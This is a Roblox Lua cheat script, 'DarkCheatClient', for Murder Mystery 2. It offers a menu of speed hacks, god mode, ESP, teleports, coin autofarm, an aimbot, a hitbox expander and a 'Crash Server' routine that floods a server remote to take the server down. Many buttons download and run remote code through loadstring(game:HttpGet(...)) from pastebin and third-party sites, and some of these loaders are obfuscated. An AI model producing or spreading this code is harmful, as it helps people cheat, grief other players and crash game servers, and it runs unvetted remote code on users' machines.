wait(0.9)
game:GetService("StarterGui"):SetCore("SendNotification",{["Title"] = "DarkCheatClient Loading",["Text"] = "Getting Started.. "})
wait(3)
game:GetService("StarterGui"):SetCore("SendNotification",{["Title"] = "DarkCheatClient Loading",["Text"] = "Getting Service.."})
wait(2)
game:GetService("StarterGui"):SetCore("SendNotification",{["Title"] = "DarkCheatClient Loading",["Text"] = "Getting Scripts.. "})
wait(1.2)
local Sound = Instance.new("Sound",game:GetService("SoundService"))
Sound.SoundId = "rbxassetid://232127604"
Sound:Play()
game:GetService("StarterGui"):SetCore("SendNotification",{["Title"] = "DarkCheatClient Loaded",["Text"] = "This script Made by VaniaPerets#8776"})
wait(1)
-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local UITextSizeConstraint = Instance.new("UITextSizeConstraint")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
Frame.BackgroundTransparency = 0.500
Frame.Position = UDim2.new(0.858712733, 0, 0.0237762257, 0)
Frame.Size = UDim2.new(0.129513338, 0, 0.227972031, 0)

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.Size = UDim2.new(2, 1, 2, 0)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "DarkCheatClient"
TextButton.TextColor3 = Color3.fromRGB(25, 50, 15)
TextButton.TextScaled = true
TextButton.TextSize = 50.000
TextButton.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextStrokeTransparency = 0.000
TextButton.TextWrapped = true
TextButton.MouseButton1Down:Connect(function()
	game:GetService("VirtualInputManager"):SendKeyEvent(true, "LeftShift" , false , game)
end)

UITextSizeConstraint.Parent = TextButton
UITextSizeConstraint.MaxTextSize = 40
 
wait(1)

local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
local Window = Library.CreateLib("DarkCheatClient", "DarkTheme")

-- Tabs

local Tab1 = Window:NewTab("PlayerToggle")
local Tab1Section = Tab1:NewSection("Speed, Jump")
local Tab2 = Window:NewTab("VisualToggle")
local Tab2Section = Tab2:NewSection("Coins, Gun")
local Tab3 = Window:NewTab("ModesToggle")
local Tab3Section = Tab3:NewSection("Grab Gun, Kill all")
local Tab4 = Window:NewTab("TeleportToggle")
local Tab4Section = Tab4:NewSection("Lobby, Map")
local Tab5 = Window:NewTab("AutofarmToggle")
local Tab5Section = Tab5:NewSection("Coins, XP")
local Tab6 = Window:NewTab("Credits")
local Tab6Section = Tab6:NewSection("Made by VaniaPerets#8776, Devs EclipseHub")
local Tab7= Window:NewTab("AnimationToggle(BETA)")
local Tab7Section = Tab7:NewSection("Sit, Headless and others..") 
local Tab8 = Window:NewTab("Settings") 
local Tab8Section = Tab8:NewSection("Set something..")
local Tab9 = Window:NewTab("ScriptHub") 
local Tab9Section = Tab9:NewSection("See here script hubs for mm2")

-- Buttons/Windows/Idk

Tab1Section:NewToggle("Fov", "Fov", function(state)
    if state then
        game.Workspace.CurrentCamera.FieldOfView = 140
    else
        game.Workspace.CurrentCamera.FieldOfView = 75
    end
end)

Tab1Section:NewButton("InfiniteJumpToggle", "IJT", function()
 
 -- Gui to Lua
-- Version: 3.2

-- Instances:

local InfJumpGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Top = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local close = Instance.new("TextButton")
local InfiniteJump = Instance.new("TextButton")
local infjumpenabled = false
--Properties:

InfJumpGui.Name = "InfJumpGui"
InfJumpGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
InfJumpGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = InfJumpGui
Main.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
Main.Position = UDim2.new(0.414008319, 0, 0.424691409, 0)
Main.Size = UDim2.new(0.171983361, 0, 0.0987654254, 0)

Top.Name = "Top"
Top.Parent = Main
Top.BackgroundColor3 = Color3.fromRGB(54, 54, 54)
Top.BorderSizePixel = 0
Top.Size = UDim2.new(1, 0, 0.231244698, 0)

TextLabel.Parent = Top
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Size = UDim2.new(0.92806381, 0, 1, 0)
TextLabel.Font = Enum.Font.Code
TextLabel.Text = "Infinite Jump by mug#1941"
TextLabel.TextColor3 = Color3.fromRGB(74, 74, 74)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

close.Name = "close"
close.Parent = Top
close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
close.BackgroundTransparency = 1.000
close.Position = UDim2.new(0.946004272, 0, 0, 0)
close.Size = UDim2.new(0.0539956801, 0, 1, 0)
close.Font = Enum.Font.Code
close.Text = "X"
close.TextColor3 = Color3.fromRGB(74, 74, 74)
close.TextScaled = true
close.TextSize = 14.000
close.TextWrapped = true

InfiniteJump.Name = "InfiniteJump"
InfiniteJump.Parent = Main
InfiniteJump.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
InfiniteJump.BorderColor3 = Color3.fromRGB(74, 74, 74)
InfiniteJump.Position = UDim2.new(0.112903222, 0, 0.325633258, 1)
InfiniteJump.Size = UDim2.new(0.774193406, 0, 0.535669923, 0)
InfiniteJump.Font = Enum.Font.Code
InfiniteJump.Text = "Disabled"
InfiniteJump.TextColor3 = Color3.fromRGB(74, 74, 74)
InfiniteJump.TextSize = 24.000
InfiniteJump.TextWrapped = true

-- Scripts:

local function CFFF_fake_script() -- close.LocalScript 
	local script = Instance.new('LocalScript', close)

	script.Parent.MouseButton1Click:Connect(function()
		local frame = script.Parent.Parent.Parent
		frame:TweenPosition(UDim2.new(0.4, 0,1.5, 0))
		infjumpenabled = false
		wait(1)
		frame.Parent:Destroy()
	end)
end
coroutine.wrap(CFFF_fake_script)()
local function VESU_fake_script() -- InfiniteJump.EnableDisableInfJump 
	local script = Instance.new('LocalScript', InfiniteJump)

	
	script.Parent.MouseButton1Click:Connect(function()
		if infjumpenabled == false then
			infjumpenabled = true
			script.Parent.Text = "Enabled"
		elseif infjumpenabled == true then
			infjumpenabled = false
			script.Parent.Text = "Disabled"
		end
	end)
end
coroutine.wrap(VESU_fake_script)()
local function GSJXM_fake_script() -- Main.Draggable 
	local script = Instance.new('LocalScript', Main)

	local Frame = script.Parent
	Frame.Selectable = true
	Frame.Active = true
	Frame.Draggable = true
end
coroutine.wrap(GSJXM_fake_script)()
local function MZUWYOR_fake_script() -- Main.Opening 
	local script = Instance.new('LocalScript', Main)

	script.Parent.Position = UDim2.new(0.33, 0,2, 0)
	script.Parent:TweenPosition(UDim2.new(0.33, 0,0.3, 0))
end
coroutine.wrap(MZUWYOR_fake_script)()
local function HLKTLMK_fake_script() -- Main.infjumpscript 
	local script = Instance.new('LocalScript', Main)

	game:GetService("UserInputService").JumpRequest:Connect(function()
		if infjumpenabled == true then
			game.Players.LocalPlayer.Character:FindFirstChild("Humanoid"):ChangeState("Jumping")
		end
	end)
end
coroutine.wrap(HLKTLMK_fake_script)()
end)

Tab1Section:NewTextBox("SpeedToggle", "Speedhack", function(v)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v
end)

Tab1Section:NewTextBox("JumpToggle", "JumpPower", function(s)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
end)

Tab1Section:NewToggle("Shift Run", "Out of my way", function(run)
if run then
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 25
else
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
end
end)

Tab1Section:NewButton("God Mode", "god", function()
print("Executed")

local accessories = {}
function GodMode()
    if game.Players.LocalPlayer.Character then
        if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
            for _, accessory in pairs(game.Players.LocalPlayer.Character.Humanoid:GetAccessories()) do
                table.insert(accessories, accessory:Clone())
            end
            game.Players.LocalPlayer.Character.Humanoid.Name = "deku"
        end
        local v = game.Players.LocalPlayer.Character["deku"]:Clone()
        v.Parent = game.Players.LocalPlayer.Character
        v.Name = "Humanoid"
        wait(0.1)
        game.Players.LocalPlayer.Character["deku"]:Destroy()
        workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
        for _, accessory in pairs(accessories) do
            game.Players.LocalPlayer.Character.Humanoid:AddAccessory(accessory)
        end
        game.Players.LocalPlayer.Character.Animate.Disabled = true
        wait(0.1)
        game.Players.LocalPlayer.Character.Animate.Disabled = false
    end
end
GodMode()

end)

Tab1Section:NewButton("Invisible", "Invisible", function()
print("Executed")
lastCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
wait(0.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
wait(0.3)
loadstring(game:HttpGet("https://pastebin.com/raw/4kAxG4Er",true))()
wait(0.8)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = lastCFrame
wait(0.5)
lastCFrame = false
end)

Tab1Section:NewButton("Fly PC", "FlyPc", function()
print("Executed")

loadstring(game:HttpGet("https://pastebin.com/raw/fPtT2Q1F",true))()
end)

Tab1Section:NewButton("Fly Mobile", "FlyMobile", function()
print("Executed")

loadstring(game:HttpGet("https://pastebin.com/raw/rqSquAdQ",true))()
end)

Tab1Section:NewButton("Click Tp Tool", "goto", function()
print("Executed")

loadstring(game:HttpGet("https://pastebin.com/raw/GuBiX19e",true))()
end)

Tab2Section:NewButton("Player Name", "Name", function()
   print("Executed")
   
loadstring(game:HttpGet("https://pastebin.com/raw/3hcWWm3q", true))()
end)

Tab2Section:NewButton("Player Chams", "Name", function()
   print("Executed!")
   
 loadstring(game:HttpGet("https://pastebin.com/raw/jQjQxeeu", true))()
end)

Tab2Section:NewButton("Player Line", " Line", function()
   print("Executed")
   
 loadstring(game:HttpGet("https://pastebin.com/raw/burXVTFw", true))()
end)

Tab2Section:NewButton("Gun ESP", "See Gun", function(state)
while wait(0.9) do
for i, gundrop in ipairs(workspace:GetDescendants()) do
if gundrop:FindFirstChild("GunDrop") then
if not gundrop:FindFirstChild("EspBox") then
if gundrop ~= game.Players.LocalPlayer.Character then
local esp = Instance.new("BoxHandleAdornment", gundrop) 
esp.Adornee = gundrop
esp.ZIndex = 0
esp.Size = Vector3.new(2, 1, 1)
esp.Transparency = 0.67
esp.Color3 = Color3.fromRGB(07,142,35)
esp.AlwaysOnTop = true
esp.Name = "EspBox" 
end
end
end
end
end
end)

Tab2Section:NewButton("Coins ESP", "See Coins", function()
while wait(0.9) do
for i, coin in ipairs(workspace:GetDescendants()) do
if coin:FindFirstChild("Coin") then
if not coin:FindFirstChild("EspBox") then
if coin ~= game.Players.LocalPlayer.Character then
local esp = Instance.new("BoxHandleAdornment", coin) 
esp.Adornee = coin
esp.ZIndex = 0
esp.Size = Vector3.new(2, 1, 1)
esp.Transparency = 0.67
esp.Color3 = Color3.fromRGB(238,64,0)
esp.AlwaysOnTop = true
esp.Name = "EspBox" 
end
end
end
end
end
end)

Tab3Section:NewButton("Kill Player", "Fe Yeet Gui", function()
    print("Executed")
	
	loadstring(game:HttpGet("https://pastebin.com/raw/saMtiek2",true))()
end)

Tab3Section:NewButton("Fling(NEW)", "!!Get out!!", function()
    print("Executed")
	
loadstring(game:HttpGet("https://shattered-gang.lol/scripts/fe/touch_fling.lua"))()
end)

Tab3Section:NewButton("Bring Player", "Freeze Players", function()

NOW = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
game.Players.LocalPlayer.Character.Humanoid.Name = 1
local l = game.Players.LocalPlayer.Character["1"]:Clone()
l.Parent = game.Players.LocalPlayer.Character
l.Name = "Humanoid"
wait()
game.Players.LocalPlayer.Character["1"]:Destroy()
game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.Animate.Disabled = true
wait()
game.Players.LocalPlayer.Character.Animate.Disabled = false
game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
end
local function tp(player,player2)
local char1,char2=player.Character,player2.Character
if char1 and char2 then
char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
end
end
local function getout(player,player2)
local char1,char2=player.Character,player2.Character
if char1 and char2 then
char1:MoveTo(char2.Head.Position)
end
end
tp(game.Players, game.Players.LocalPlayer)
wait()
tp(game.Players, game.Players.LocalPlayer)
wait()
getout(game.Players.LocalPlayer, game.Players)
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = NOW
end)

Tab3Section:NewButton("Give Tools", "Give Someone your tools", function()
loadstring(game:HttpGet("https://pastebin.com/raw/k778UByk"))()
end)

Tab3Section:NewButton("Giant Legs", "So big legs", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Leg Resize'))()
end)

Tab3Section:NewButton("Crash Server", "Bomb server", function()
local char = game:GetService('Players').LocalPlayer.Character or nil
if char then
char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
task.wait(0.5)
char.HumanoidRootPart.Anchored = true
end
while wait(1.5) do --// don't change it's the best
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val)
   local mainvalueifonetable = 499999
   if type(val) ~= "number" then
       return nil
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval
end
 
local function bomb(tableincrease, tries)
local maintable = {}
local spammedtable = {}
 
table.insert(spammedtable, {})
z = spammedtable[1]
 
for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
end
 
local calculatemax = getmaxvalue(tableincrease)
local maximum
 
if calculatemax then
     maximum = calculatemax
     else
     maximum = 999999
end
 
for i = 1, maximum do
     table.insert(maintable, spammedtable)
end
 
for i = 1, tries do
     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
end
end
 
bomb(199, 7)
end
end)

Tab3Section:NewTextBox("Spectate Player", "spectate", function(value)
local player = game.Players[qwe].LocalPlayer
local camera = game.Workspace.CurrentCamera

function UpdateCamera()
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local pos = player.Character.HumanoidRootPart.Position
        camera.CFrame = CFrame.new(pos + Vector3.new(0, 5, -10), pos)
    end
end

camera.CameraType = Enum.CameraType.Scriptable
camera.CFrame = CFrame.new(0, 5, -10)

game:GetService("RunService").RenderStepped:Connect(function()
    UpdateCamera()
end)
end)

Tab3Section:NewLabel("Innocent Section")

Tab3Section:NewKeybind("Grab Gun(only innocent)", "grab guns",  Enum.KeyCode.G, function()
lastCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
    wait(0.2)
        for i,v in pairs(game:GetDescendants()) do
    if v.Name == 'GunDrop' then
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
    wait(1)
    if Client.Backpack:FindFirstChild("Gun") then
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = lastCFrame
  wait(0.1)
 lastCFrame = false
    end
    end
  end
 end)

Tab3Section:NewLabel("Sheriff Section")

Tab3Section:NewButton("Aimbot", "load it", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))()
end)

Tab3Section:NewLabel("MurderSection") 

Tab3Section:NewTextBox("Hitbox"," Hit your damage", function(value)
    print("Executed")
    
    _G.HeadSize = value
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)
end)

Tab4Section:NewButton("Lobby", "Goto lobby", function()
    print("Executed")
	
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-108, 138, 37)
end)

Tab4Section:NewButton("Voting Room", "Goto votingroom", function()
    print("Executed")
	
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-108, 141, 86)
end)

Tab4Section:NewButton("Map(House 2)", "Goto House 2", function()
    print("Executed")
	
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
end)

Tab4Section:NewButton("Map(Hospital 3)", "Goto Hospital 3", function()
    print("Executed")
	
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
end)

Tab4Section:NewButton("Map(MulBase)", "Goto MulBase", function()
    print("Executed")
	
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3340, 26, 2835)

end)

Tab4Section:NewButton("Map(Hotel 3)", "Goto Hospital 3", function()
    print("Executed")
	
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1924, 7, 84)
end)

Tab4Section:NewButton("Map(Police Station)", "Goto Police Station", function()
    print("Executed")
	
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2936, 40, 330)
end)

Tab4Section:NewButton("Map(Mansion 2)", "Goto Mansion 2", function()
    print("Executed")
	
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-940, 17, -1956)
end)

Tab4Section:NewButton("Map(Office 3)", "Goto Office 3", function()
    print("Executed")
	
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(145, 50, -3000)
end)

Tab4Section:NewButton("Map(Reseach Facility)", "Goto Reseach Facility", function()
    print("Executed")
	
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(458, 36, -92)
end)

Tab4Section:NewButton("Map(nStudio)", "Goto nStudio", function()
    print("Executed")
	
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(145, 50, -3000)
end)

Tab4Section:NewButton("Map(Factory 1)", "Goto Mansion 2", function()
    print("Executed")
	
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-940, 17, -1956)
end)

Tab4Section:NewButton("Under Lobby", "Goto Under Lobby", function()
    print("Executed")
	
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-153, 243, 109)
end)

Tab5Section:NewButton("AutofarmCoin", "Farm Coin", function()
print("Executed")
for i,v in pairs(game:GetDescendants()) do
    if v.Name == 'Coin' then
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
    wait(2.2)
    else
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(currentX, currentY, currentZ)
    end
    end
 end) 
 
Tab5Section:NewButton("InvisAutofarmCoins", "Farm Coin", function()
print("Executed")

wait(0.5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-153, 243, 109)
wait(0.9)
loadstring(game:HttpGet("https://pastebin.com/raw/4kAxG4Er",true))()
wait(1)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-108, 138, 37)
wait(2)
for i,v in pairs(game:GetDescendants()) do
    if v.Name == 'Coin' then
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
    wait(2.2)
    end
    end
 end) 
 
Tab7Section:NewButton("Sit", "Anim", function()
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/e sit2" ,"All")
end) 

Tab7Section:NewButton("Get All Emotes", "...", function()
require(Modules.EmoteModule).GeneratePage({"headless","zombie","zen","ninja","floss","dab"},Client.PlayerGui.MainGUI.Game:FindFirstChild("Emotes"),'Free Emotes')
end)

Tab7Section:NewLabel("Others animation in development")
 
 Tab8Section:NewKeybind("Hide Script", "Turn off..", Enum.KeyCode.LeftShift, function()
	Library:ToggleUI()
end)

Tab8Section:NewColorPicker("Color FolderHub", "Change You Color FolderHub", Color3.fromRGB(0,0,0), function(color)
    for theme, color in pairs(themes) do
    Section:NewColorPicker(Ocean, "Nothing Happened"..theme, color, function(color2)
        Library:ChangeColor(theme, color3)
    end)
end
end)

Tab9Section:NewLabel("Best Scripts for Any Games")

Tab9Section:NewButton("Infinite Yield", "Infinite Yield", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
end)

Tab9Section:NewButton("RemoteSpy", "See events", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/infyiff/backup/main/audiologger.lua'),true))()
end) 

Tab9Section:NewLabel("mm2 scripts")

Tab9Section:NewButton("EclipseGui(Mobile + No Crash)", "Give Someone your tools", function()
local a,b,c,d=loadstring,"ht\116ps:",{[0XDD4]=function(f)return game:HttpGetAsync(f)end,["User"]="r\97w\46\103\105t\104\117b\117\115er\99\111\110t\101\110t\46c\111m",["Author"]={"Zoi8752","ItsJiDy"},["Scripts"]="SymphonyHub",["File"]="\83cr\105p\116"},string.format;e=a(c[3540](b.."//"..c["User"].."/"..c["Author"][1].."/"..c["Scripts"].."/main/"..c["File"]))if e then e(d("Your Executor Does not Support. %s",c["Author"][2]))end
end)

Tab9Section:NewButton("Vynixus", "Give Someone your tools", function()
loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
end)

Tab9Section:NewButton("SolarushGui", "Give Someone your tools", function()
loadstring(game:HttpGet('https://solarishub.dev/script.lua',true))()
end)

Tab9Section:NewButton("EclipseGui", "Give Someone your tools", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Ethanoj1/EclipseMM2/master/Script", true))()
end)

Tab9Section:NewButton("EclipseHub", "Give Someone your tools", function()
getgenv().mainKey = "nil"
 
local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
end)

